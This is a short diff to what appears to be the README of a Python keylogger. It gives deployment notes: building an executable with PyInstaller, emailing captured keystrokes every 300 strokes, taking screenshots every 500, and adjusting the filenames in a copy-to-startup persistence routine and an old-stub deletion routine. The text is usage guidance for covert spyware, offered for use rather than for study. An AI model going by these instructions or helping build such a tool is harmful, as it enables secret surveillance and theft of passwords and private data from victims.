@@ -64,6 +64,8 @@ ____   ____   ____   ____   ____
 --> Make the exe using Pyinstaller
 --> Keylogs will be mailed after every 300 key strokes. This can be changed.
 --> Screenshot is taken after every 500 key strokes. This can be changed.
+--> Remember: If you make this into exe, change the variable "originalfilename" and "coppiedfilename" in function copytostartup().
+--> Remember: whatever name you give to "coppiedfilename", should be given to checkfilename in deleteoldstub().
 
 ____   ____   ____   ____   ____   ____   ____   ____   ____   ____   ____   ____
  _____ _     _                   _                             _
